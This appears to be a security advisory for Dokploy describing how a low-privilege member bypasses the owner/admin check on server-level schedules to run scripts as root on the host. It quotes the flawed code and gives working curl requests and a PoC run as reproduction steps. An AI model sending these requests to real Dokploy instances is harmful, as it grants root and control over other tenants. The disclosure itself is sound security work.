repo.description:
### Summary
A low-privilege Dokploy member can run commands as root on the host that Dokploy runs on. The member needs no host-access flags, only permission to create a service and access to one application. Dokploy lets only owners and admins create host-level schedules (the `server` and `dokploy-server` types). That owner/admin check runs only when the schedule request is not tied to an application or compose service. A member who ties the request to an application it can access skips the check: Dokploy validates service access instead, never runs the owner/admin check, and the member's `dokploy-server` schedule runs its script as root.

### Details
`schedule.create` (`apps/dokploy/server/api/routers/schedule.ts:30-77`) is a `protectedProcedure`. It derives `serviceId` from caller input and branches on it; the owner/admin gate (the CVE-2026-45632 fix) lives only in the `else` branch:

```ts
const serviceId = input.applicationId || input.composeId;   // attacker-controlled
if (serviceId) {
    await checkServicePermissionAndAccess(ctx, serviceId, { schedule: ["create"] });  // service access only
} else {
    await checkPermission(ctx, { schedule: ["create"] });
    if (input.scheduleType === "server" || input.scheduleType === "dokploy-server") {
        const member = await findMemberByUserId(ctx.user.id, ctx.session.activeOrganizationId);
        if (member.role !== "owner" && member.role !== "admin") {   // THE GATE (only on this branch)
            throw new TRPCError({ code: "FORBIDDEN", message: "Only owners and admins can manage server-level schedules." });
        }
    }
}
```

Because `serviceId` comes from the caller, a member sends a `dokploy-server` schedule together with an `applicationId` it can access. The request takes the `if` branch, which only verifies service access, so the owner/admin check never runs. From there it is the same root execution CVE-2026-45632 addressed: a `dokploy-server` schedule runs its member-supplied script via `bash -c` as root (`packages/server/src/utils/schedules/utils.ts:127-135`, run by `schedule.runManually`). `schedule.update` has the same structure.

### PoC

[poc.py](https://github.com/user-attachments/files/29250338/poc.py) bootstraps an owner on a fresh instance, creates a member scoped to one application, then runs the exploit as that member. It can also sign in as an existing member with `--user-email` and `--application-id`.

```bash
python3 poc.py --url http://127.0.0.1:3000
# existing instance: add --owner-email you@example.com --owner-pass '...'
```

It sends the negative control first, then the bypass. The control has no `applicationId`, so it takes the no-service branch where the owner/admin gate runs. The bypass adds an accessible `applicationId`, which switches the request to the service-access branch; that branch does not repeat the host-schedule owner/admin check.

```text
schedule.create {scheduleType:"dokploy-server", /* no applicationId */}
  -> FORBIDDEN  "Only owners and admins can manage server-level schedules."

schedule.create {scheduleType:"dokploy-server", applicationId:"<member's app>", script:"id; ..."}
  -> 200 OK  ;  schedule.runManually -> script runs as root
```

Curl reproduction, authenticated as the member (better-auth session cookie):

```sh
# negative control (no applicationId) -> the gate fires:
curl -s -b member.cookies -H 'Content-Type: application/json' -X POST "$URL/api/trpc/schedule.create?batch=1" \
  -d '{"0":{"json":{"name":"c","cronExpression":"0 0 31 12 *","command":"true","shellType":"bash","scheduleType":"dokploy-server","enabled":false}}}'
  # -> FORBIDDEN "Only owners and admins can manage server-level schedules."

# bypass: tie the same request to an accessible application -> accepted:
curl -s -b member.cookies -H 'Content-Type: application/json' -X POST "$URL/api/trpc/schedule.create?batch=1" \
  -d '{"0":{"json":{"name":"poc","cronExpression":"0 0 31 12 *","command":"true","shellType":"bash","scheduleType":"dokploy-server","applicationId":"<member_app_id>","script":"id; uname -a","enabled":false}}}'
  # -> 200 + scheduleId; schedule.runManually then runs the script as root (read back via deployment.readLogs)
```

### Impact
A non-admin member with access to a single application (the core use of the per-member permission model) runs arbitrary code as root on the Dokploy host, and so controls every other organization, project, and service on the instance. None of the member's host flags (`canAccessToDocker`, `canAccessToSSHKeys`, `canAccessToTraefikFiles`) are consulted on this path. The `dokploy-server` host variant is blocked under `IS_CLOUD`; the `server` (remote-server) variant takes the same bypass and is not cloud-gated. Verified on `v0.29.8`.
repo.summary: Non-admin member gains root on the host by bypassing the owner/admin check on server-level schedules (incomplete fix of CVE-2026-45632)
